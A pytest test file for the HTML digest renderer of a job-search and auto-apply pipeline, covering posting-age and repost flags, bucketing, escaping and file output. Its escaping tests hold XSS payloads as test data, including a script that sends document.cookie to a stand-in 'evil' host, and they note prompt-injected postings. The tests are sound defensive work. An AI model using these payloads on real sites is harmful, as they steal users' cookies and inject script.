"""Tests for src/digest.py — the file the user actually opens.

Everything else in this pipeline is plumbing feeding this page, so two
properties dominate:

  * **Escaping.** Job titles, companies and descriptions are attacker-
    controllable text from the open internet, rendered into HTML that opens
    from `file://` — the most privileged origin on the machine. Autoescape is
    not a nicety here.
  * **Legibility of failure.** A run that fetched nothing because every board
    404'd produces a page that looks a lot like a quiet Tuesday. The funnel
    and the error list are what make those two distinguishable, so they must
    render even when there are no jobs at all.
"""

from __future__ import annotations

import re
from datetime import timedelta
from pathlib import Path

import pytest

from src.digest import (
    DEFAULT_STALE_AFTER_DAYS,
    RELATIVE_DAYS_LIMIT,
    build_context,
    posting_age_days,
    relative_time,
    render_html,
    write_digest,
)
from src.models import ApplyStatus, RunStats
from tests.conftest import NOW, make_job, make_scored, write_config

XSS = '<img src=x onerror=alert(1)>Engineer'


def digest_config(tmp_path: Path, **overrides):
    base = {"output": {"dir": str(tmp_path / "output"), "open_browser": False}}
    base.update(overrides or {})
    return write_config(tmp_path, base)


def sample_jobs(tmp_path: Path):
    """One job in each outcome bucket."""
    needs_click = make_scored(score=91, company="Northwind", ats_job_id="1")

    applied = make_scored(score=95, company="Globex", ats_job_id="2")
    applied.status = ApplyStatus.APPLIED
    applied.status_detail = "submitted via greenhouse"

    dry = make_scored(score=88, company="Initech", ats_job_id="3")
    dry.status = ApplyStatus.DRY_RUN
    dry.status_detail = "dry run — filled name, email, phone, not submitted"
    shot = tmp_path / "output" / "applications" / "initech" / "form_filled.png"
    shot.parent.mkdir(parents=True, exist_ok=True)
    shot.write_bytes(b"\x89PNG\r\n\x1a\nfake")
    dry.artifacts.screenshot = str(shot)

    failed = make_scored(score=84, company="Umbrella", ats_job_id="4")
    failed.status = ApplyStatus.APPLY_FAILED
    failed.status_detail = "dropdown 'Country' — this bot never picks an option for you"

    below = make_scored(score=41, company="Soylent", ats_job_id="5")
    below.status = ApplyStatus.SCORED_BELOW
    below.status_detail = "score 41 is below threshold 65"

    return [needs_click, applied, dry, failed, below]


def stats():
    s = RunStats(fetched=312, after_dedupe=287, after_filters=41,
                 already_seen=29, scored=12, matches=5, tailored=5,
                 auto_applied=1, dry_run=1, apply_failed=1, digest_items=1)
    s.source_counts.update({"greenhouse": 200, "lever": 112})
    s.errors.append("greenhouse/dead: HTTP 404 (slug not found)")
    return s


# ==========================================================================
# relative_time
# ==========================================================================


@pytest.mark.parametrize(
    "delta,expected_fragment",
    [
        (timedelta(seconds=30), "just now"),
        (timedelta(minutes=45), "45m"),
        (timedelta(hours=3), "3h"),
        (timedelta(hours=30), "yesterday"),
        (timedelta(days=4), "4d"),
    ],
)
def test_relative_time(delta, expected_fragment):
    assert expected_fragment in relative_time(NOW - delta, NOW)


def test_relative_time_on_an_undated_posting():
    assert relative_time(None, NOW) == "—"


# ==========================================================================
# posting age — and the refusal to invent one
# ==========================================================================


def test_posting_age_is_measured_in_days():
    assert posting_age_days(NOW - timedelta(days=45), NOW) == pytest.approx(45)


def test_an_undated_posting_has_no_age_at_all():
    """Not zero, not "fresh" — `None`. The only honest answer, and the one
    thing between this feature and a card that quietly presents `first_seen_at`
    as a posting date."""
    assert posting_age_days(None, NOW) is None


def test_the_card_states_the_age_of_a_recent_posting(tmp_path: Path):
    item = build_context([make_scored(score=90, hours_old=72)], stats(),
                         digest_config(tmp_path), now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == 3
    assert item["posted_label"] == "posted 3d ago"


def test_the_card_states_the_age_of_a_very_old_posting_too(tmp_path: Path):
    """`relative_time` switches to a calendar date past
    `RELATIVE_DAYS_LIMIT`, which is easier to place but stops answering the
    question. On a posting old enough to be flagged, the age in days *is* the
    news, so the card prints both."""
    old = make_scored(score=90, hours_old=24 * (RELATIVE_DAYS_LIMIT + 40))
    item = build_context([old], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == RELATIVE_DAYS_LIMIT + 40
    assert "100 days ago" in item["posted_label"]
    assert "2026-04-26" in item["posted_label"]     # and still the date


def test_an_undated_card_says_so_instead_of_guessing(tmp_path: Path, memory_tracker):
    """The tracker knows exactly when it first *fetched* this job, and that
    date is right there for the taking. Printing it would manufacture a
    freshness the source never claimed, so the card shows no date, no age and
    no flag. An undated posting has to look undated.
    """
    undated = make_scored(score=90, hours_old=None)
    # The fact the card must not reach for: a first_seen_at, three days ago.
    memory_tracker.record_job(undated.job, now=NOW - timedelta(days=3))

    ctx = build_context([undated], stats(), digest_config(tmp_path), now=NOW,
                        tracker=memory_tracker)
    item = ctx["needs_click"][0]

    assert item["posted_age_days"] is None
    assert item["posted_at"] == ""
    assert item["posted_at_iso"] == ""
    assert item["posted_label"] == "no posting date"
    html = render_html(ctx)
    assert "no posting date" in html
    assert "2026-08-01" not in html          # the first_seen_at, unmentioned
    assert "3d ago" not in html


# ==========================================================================
# the stale flag — advisory, never a filter
# ==========================================================================


def test_an_old_posting_is_flagged_stale(tmp_path: Path):
    """One posting in five is never filled, and the old ones are where they
    gather. The flag is the cheapest thing this pipeline can tell you."""
    old = make_scored(score=90, hours_old=24 * 45)
    item = build_context([old], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["stale"] is True
    assert any("45 days" in flag for flag in item["flags"])


def test_a_recent_posting_is_not_flagged_stale(tmp_path: Path):
    """The neighbouring case. A flag that fires on a two-day-old posting is a
    flag nobody reads by the end of the week."""
    fresh = make_scored(score=90, hours_old=48)
    item = build_context([fresh], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["stale"] is False
    assert item["flags"] == []


def test_a_posting_exactly_at_the_stale_threshold_is_not_flagged(tmp_path: Path):
    """Boundary, stated the same way `is_fresh` states its own: at the limit
    is inside it. An hour past is not."""
    at = make_scored(score=90, hours_old=24 * DEFAULT_STALE_AFTER_DAYS,
                     ats_job_id="at")
    past = make_scored(score=90, hours_old=24 * DEFAULT_STALE_AFTER_DAYS + 1,
                       ats_job_id="past")
    ctx = build_context([at, past], stats(), digest_config(tmp_path), now=NOW)
    flags = {item["key"]: item["stale"] for item in ctx["needs_click"]}
    assert flags[at.job.key] is False
    assert flags[past.job.key] is True


def test_an_undated_posting_is_never_flagged_stale(tmp_path: Path):
    """The case that would otherwise be got wrong by treating a missing date
    as an infinitely old one. There is nothing to judge here, and guessing
    would put a ghost-job warning on every LinkedIn alert item there is."""
    undated = make_scored(score=90, hours_old=None)
    item = build_context([undated], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["posted_age_days"] is None
    assert item["stale"] is False
    assert item["flags"] == []


def test_the_stale_threshold_is_configurable(tmp_path: Path):
    old = make_scored(score=90, hours_old=24 * 45)
    cfg = digest_config(tmp_path, freshness={"stale_after_days": 60})
    item = build_context([old], stats(), cfg, now=NOW)["needs_click"][0]
    assert item["stale"] is False


def test_the_stale_flag_reaches_the_page(tmp_path: Path):
    old = make_scored(score=90, hours_old=24 * 45)
    html = render_html(build_context([old], stats(), digest_config(tmp_path), now=NOW))
    assert "On the market 45 days" in html


# ==========================================================================
# the repost flag — the half that needs the tracker
# ==========================================================================


def relisted(tracker, *, gap_days, posted=True, age_days=0):
    """Seed one earlier listing of `make_job()`'s role and return today's one.

    Same company, same title, same city — so the same `dedupe_key` — under a
    different ATS id, which is what a re-opened requisition looks like.

    `age_days` is how old today's listing itself is; the earlier one appeared
    `gap_days` before *that*, so the gap under test is exactly `gap_days`.
    `posted=False` makes the earlier listing undated, leaving `first_seen_at`
    as the only thing to measure from.
    """
    listed_at = NOW - timedelta(days=age_days)
    earlier_at = listed_at - timedelta(days=gap_days)
    earlier = make_job(ats_job_id="old", hours_old=None,
                       posted_at=earlier_at if posted else None)
    tracker.record_job(earlier, now=earlier_at)

    today = make_scored(score=90, ats_job_id="new", hours_old=None,
                        posted_at=listed_at)
    tracker.record_job(today.job, now=NOW)
    assert today.job.dedupe_key == earlier.dedupe_key
    assert today.job.key != earlier.key
    return today


def test_a_relisting_after_a_gap_is_flagged(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=90)
    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 90
    assert any("Re-listed" in flag for flag in item["flags"])


def test_a_simultaneous_cross_source_duplicate_is_not_flagged_as_a_repost(
        tmp_path: Path, memory_tracker):
    """The neighbouring case, and the one that matters most.

    The same live job reaching us from Greenhouse and from Adzuna in one run
    has one `dedupe_key` and two `Job.key`s — indistinguishable from a
    re-listing except by time. Flagging it would put a ghost-job warning on a
    healthy posting every single morning.
    """
    aggregator_copy = make_job(source="adzuna", ats=None, ats_job_id=None,
                               url="https://www.adzuna.de/details/1", hours_old=3)
    memory_tracker.record_job(aggregator_copy, now=NOW)

    today = make_scored(score=90, hours_old=3)
    memory_tracker.record_job(today.job, now=NOW)
    assert today.job.dedupe_key == aggregator_copy.dedupe_key
    assert today.job.key != aggregator_copy.key

    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 0
    assert item["flags"] == []


def test_a_repost_whose_earlier_listing_was_undated_is_still_flagged(
        tmp_path: Path, memory_tracker):
    """The gap survives a missing date on either side: two sightings ninety
    days apart are ninety days apart whatever the boards claimed. The fallback
    is `first_seen_at`, which is *our* observation and can only ever shrink
    the gap — never invent one."""
    today = relisted(memory_tracker, gap_days=90, posted=False)
    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 90
    assert any("Re-listed" in flag for flag in item["flags"])


def test_the_repost_gap_threshold_is_configurable(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=20)
    cfg = digest_config(tmp_path, freshness={"repost_min_gap_days": 30})
    item = build_context([today], stats(), cfg, now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 20        # measured ...
    assert item["flags"] == []                  # ... but under the threshold


def test_without_a_tracker_there_is_simply_no_repost_flag(tmp_path: Path):
    """`tracker=` is optional. Leaving it out costs one advisory line and
    changes nothing else on the page."""
    today = make_scored(score=90, ats_job_id="new", hours_old=1)
    item = build_context([today], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["flags"] == []


def test_a_tracker_that_raises_costs_one_flag_not_the_page(tmp_path: Path):
    """By the time the digest runs, the run's money is already spent. A
    tracker problem must not take the card — or the page — down with it."""

    class BrokenTracker:
        def repost_gap_days(self, *args, **kwargs):
            raise RuntimeError("database is locked")

    old = make_scored(score=90, company="Northwind", hours_old=24 * 45)
    ctx = build_context([old], stats(), digest_config(tmp_path), now=NOW,
                        tracker=BrokenTracker())
    item = ctx["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["stale"] is True               # the other flag still works
    assert "Northwind" in render_html(ctx)     # and the card is still there


def test_a_hand_built_item_with_no_flags_key_still_renders(tmp_path: Path):
    """`render_html` documents that it takes a partial context, and the
    fallback path and older fixtures both build items by hand. Losing the
    whole page over a missing advisory line would be the wrong trade twice
    over."""
    context = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    context["needs_click"] = [{"company": "Handmade", "title": "Engineer",
                               "score_label": "80", "score_class": "score-80",
                               "url": "https://example.com/1"}]
    assert "Handmade" in render_html(context)


def test_the_repost_flag_reaches_the_page(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=90)
    html = render_html(build_context([today], stats(), digest_config(tmp_path),
                                     now=NOW, tracker=memory_tracker))
    assert "Re-listed" in html


# ==========================================================================
# the governing constraint: a flag is never a filter
# ==========================================================================


def test_flagging_never_removes_a_job_from_the_digest(tmp_path: Path, memory_tracker):
    """The invariant the whole feature is subordinate to.

    A stale, re-listed, undated posting is exactly the profile these flags are
    looking for — and it must still be on the page, in its section, counted in
    the totals, with its link intact. A wrong flag costs a glance; a wrong
    deletion costs an opportunity the user never learns existed.
    """
    today = relisted(memory_tracker, gap_days=200, age_days=200)

    cfg = digest_config(tmp_path)
    without = build_context([today], stats(), cfg, now=NOW)
    with_tracker = build_context([today], stats(), cfg, now=NOW,
                                 tracker=memory_tracker)

    item = with_tracker["needs_click"][0]
    assert item["stale"] is True
    assert len(item["flags"]) == 2                       # both flags fired ...
    assert with_tracker["totals"] == without["totals"]   # ... and nothing moved
    assert with_tracker["funnel"] == without["funnel"]
    assert len(with_tracker["needs_click"]) == 1
    assert item["url"] == today.job.url
    assert item["score"] == 90


def test_the_funnel_is_untouched_by_the_flags(tmp_path: Path, memory_tracker):
    """Stated separately because the funnel is the number a user reads to tell
    a quiet day from a broken pipeline. If flagging ever started dropping
    jobs, this is where it would show — and it must not."""
    scored = [relisted(memory_tracker, gap_days=90)]
    scored.append(make_scored(score=70, ats_job_id="fresh", hours_old=2))
    scored.append(make_scored(score=60, ats_job_id="undated", hours_old=None,
                              status=ApplyStatus.SCORED_BELOW))

    ctx = build_context(scored, stats(), digest_config(tmp_path), now=NOW,
                        tracker=memory_tracker)
    assert {step["label"]: step["value"] for step in ctx["funnel"]}["fetched"] == 312
    assert ctx["totals"]["all"] == 3
    assert ctx["totals"]["needs_click"] == 2
    assert ctx["totals"]["below"] == 1


# ==========================================================================
# build_context — bucketing
# ==========================================================================


def test_every_job_lands_in_the_right_bucket(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Northwind"]
    assert [i["company"] for i in ctx["auto_applied"]] == ["Globex"]
    assert [i["company"] for i in ctx["dry_run"]] == ["Initech"]
    assert [i["company"] for i in ctx["failed"]] == ["Umbrella"]
    assert [i["company"] for i in ctx["below"]] == ["Soylent"]


def test_needs_click_is_sorted_by_score_descending(tmp_path: Path):
    jobs = [make_scored(score=s, ats_job_id=str(s)) for s in (70, 95, 82)]
    ctx = build_context(jobs, stats(), digest_config(tmp_path), now=NOW)
    assert [i["score"] for i in ctx["needs_click"]] == [95, 82, 70]


def test_bucketing_is_stable_for_equal_scores(tmp_path: Path):
    """A digest that reshuffles between runs over the same data is a digest
    you stop trusting."""
    jobs = [make_scored(score=80, company=f"C{i}", ats_job_id=str(i)) for i in range(5)]
    cfg = digest_config(tmp_path)
    first = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    second = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    assert [i["company"] for i in first] == [i["company"] for i in second]


def test_items_are_plain_dicts_not_scored_jobs(tmp_path: Path):
    """The template must not be able to reach back into pipeline objects."""
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    for item in ctx["needs_click"]:
        assert isinstance(item, dict)


def test_an_item_carries_everything_the_page_shows(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    item = ctx["needs_click"][0]
    for key in ("key", "company", "title", "location", "url", "source", "score",
                "verdict", "reasons", "gaps", "status", "status_detail"):
        assert key in item, key


def test_context_carries_the_funnel_and_the_errors(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    labels = {step["label"]: step["value"] for step in ctx["funnel"]}
    assert labels["fetched"] == 312
    assert labels["matched"] == 5
    assert ctx["source_counts"]["greenhouse"] == 200
    assert any("404" in e for e in ctx["errors"])


def test_build_context_is_pure(tmp_path: Path):
    """No I/O and no ambient clock — the same inputs give the same page."""
    jobs = sample_jobs(tmp_path)
    cfg = digest_config(tmp_path)
    assert build_context(jobs, stats(), cfg, now=NOW) == build_context(
        jobs, stats(), cfg, now=NOW)


def test_build_context_skips_an_unrenderable_record_without_blanking_the_page(
        tmp_path: Path):
    broken = make_scored(score=90, ats_job_id="9")
    broken.job = None                       # type: ignore[assignment]
    good = make_scored(score=80, company="Fine", ats_job_id="8")
    ctx = build_context([broken, good], stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Fine"]


def test_build_context_with_no_jobs_at_all(tmp_path: Path):
    ctx = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    assert ctx["totals"]["all"] == 0
    assert ctx["funnel"]


def test_filter_counts_ride_along_on_run_stats(tmp_path: Path):
    """A cross-module contract worth pinning: `RunStats` has no
    `filter_counts` field, so `main` attaches the FilterResult counts as a
    dynamic attribute and the digest reads them off. Without them the funnel
    shows 287 jobs vanishing with no explanation of why.
    """
    s = stats()
    s.filter_counts = {"stale": 198, "location_outside_eu": 31, "undated": 12}
    ctx = build_context([], s, digest_config(tmp_path), now=NOW)
    assert ctx["filter_counts"]["stale"] == 198
    # Displayed biggest-first, since that is the one worth acting on.
    assert list(ctx["filter_counts"]) == ["stale", "location_outside_eu", "undated"]
    assert "198" in render_html(ctx)


def test_missing_filter_counts_is_not_an_error(tmp_path: Path):
    ctx = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    assert ctx["filter_counts"] == {}
    assert render_html(ctx)


# ==========================================================================
# render_html — escaping
# ==========================================================================


def test_a_hostile_job_title_is_escaped(tmp_path: Path):
    """Job text comes from the open internet and the page opens from file://,
    the most privileged origin on the machine."""
    job = make_scored(score=90, title=XSS, company='"><script>alert(1)</script>')
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<img src=x onerror" not in html
    assert "<script>alert(1)</script>" not in html
    assert "&lt;img" in html or "&lt;script" in html


def test_a_hostile_description_is_escaped(tmp_path: Path):
    job = make_scored(score=90,
                      description="<script>fetch('http://evil/'+document.cookie)</script>")
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<script>fetch(" not in html


def test_hostile_model_output_is_escaped(tmp_path: Path):
    """The model's own reasons are text it was fed — a prompt-injected posting
    can put markup there too."""
    job = make_scored(score=90, reasons=["<iframe src=evil></iframe>"])
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<iframe" not in html


def test_a_hostile_error_string_is_escaped(tmp_path: Path):
    s = stats()
    s.errors.append("<script>alert('errors')</script>")
    html = render_html(build_context([], s, digest_config(tmp_path), now=NOW))
    assert "<script>alert('errors')</script>" not in html


# ==========================================================================
# render_html — content
# ==========================================================================


def test_the_page_renders_every_section(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    lowered = html.lower()
    for heading in ("needs your click", "auto-applied", "dry run", "below threshold"):
        assert heading in lowered, heading


def test_the_page_is_self_contained(tmp_path: Path):
    """It opens from file:// — a CDN reference is a blank page on a train."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "<style" in html
    for remote in ("https://cdn", "http://cdn", "cdnjs", "googleapis",
                   "unpkg.com", "jsdelivr"):
        assert remote not in html, remote
    # No remote <link>/<script> src of any kind.
    assert not re.search(r'<(?:script|link)[^>]+(?:src|href)=["\']https?://', html)


def test_application_links_open_safely(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert 'target="_blank"' in html
    assert "noopener" in html


def test_the_funnel_is_rendered_so_a_broken_run_is_visible(tmp_path: Path):
    html = render_html(build_context([], stats(), digest_config(tmp_path), now=NOW))
    assert "312" in html          # fetched
    assert "404" in html          # the error that explains a quiet day


def test_a_completely_empty_run_still_renders_a_usable_page(tmp_path: Path):
    html = render_html(build_context([], RunStats(), digest_config(tmp_path), now=NOW))
    assert len(html) > 500
    assert "<html" in html.lower() or "<!doctype" in html.lower() or "<body" in html.lower()
    assert "nothing new" in html.lower() or "0" in html


def test_the_dry_run_screenshot_is_linked_and_inlined(tmp_path: Path):
    """Checking screenshots is the entire point of dry-run week; making the
    user hunt for the file defeats it."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "form_filled.png" in html
    assert "<img" in html


def test_the_bail_reason_is_shown_verbatim(tmp_path: Path):
    """This is how the user learns what the safety rules are catching."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "never picks an option" in html


def test_the_dry_run_state_is_stated_on_the_page(tmp_path: Path):
    cfg = digest_config(tmp_path, apply={"dry_run": True, "enabled": True})
    html = render_html(build_context(sample_jobs(tmp_path), stats(), cfg, now=NOW))
    assert "dry" in html.lower()


def test_a_failed_score_is_shown_as_unscored_not_as_zero(tmp_path: Path):
    """Rendering "0" would read as "terrible fit" rather than "we could not
    judge this one" — which are opposite instructions to the reader."""
    job = make_scored(score=0, error="API timeout")
    job.status_detail = "scorer failed (API timeout) — shown unscored, judge it yourself"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)

    item = ctx["needs_click"][0]
    assert item["score_label"] == "?"          # not "0"
    assert item["score_error"] == "API timeout"
    assert "API timeout" in render_html(ctx)


def test_a_scorer_error_is_not_printed_twice(tmp_path: Path):
    """`status_detail` quotes the same error the card already shows; printing
    both makes a one-line problem look like two."""
    job = make_scored(score=0, error="API timeout")
    job.status_detail = "scorer failed (API timeout) — shown unscored"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)
    assert render_html(ctx).count("API timeout") == 1


# ==========================================================================
# write_digest
# ==========================================================================


def test_write_digest_writes_a_dated_file(tmp_path: Path):
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert path.name == "digest_2026-08-04.html"
    assert path.exists()
    assert path.read_text(encoding="utf-8").strip()


def test_write_digest_also_writes_a_stable_latest_copy(tmp_path: Path):
    """So a cron user can bookmark exactly one URL."""
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    latest = path.parent / "digest_latest.html"
    assert latest.exists()
    assert latest.read_text(encoding="utf-8") == path.read_text(encoding="utf-8")


def test_write_digest_creates_the_output_directory(tmp_path: Path):
    cfg = digest_config(tmp_path, output={"dir": str(tmp_path / "deep" / "nested")})
    assert write_digest([], RunStats(), cfg, now=NOW).exists()


def test_rerunning_overwrites_todays_digest(tmp_path: Path):
    cfg = digest_config(tmp_path)
    first = write_digest([], RunStats(), cfg, now=NOW)
    second = write_digest(sample_jobs(tmp_path), stats(), cfg, now=NOW)
    assert first == second
    assert "Northwind" in second.read_text(encoding="utf-8")


def test_write_digest_is_utf8(tmp_path: Path):
    job = make_scored(score=90, company="Zürich Insurance",
                      title="Ingénieur Backend (m/w/d)")
    path = write_digest([job], stats(), digest_config(tmp_path), now=NOW)
    text = path.read_text(encoding="utf-8")
    assert "Zürich" in text
    assert "Ingénieur" in text
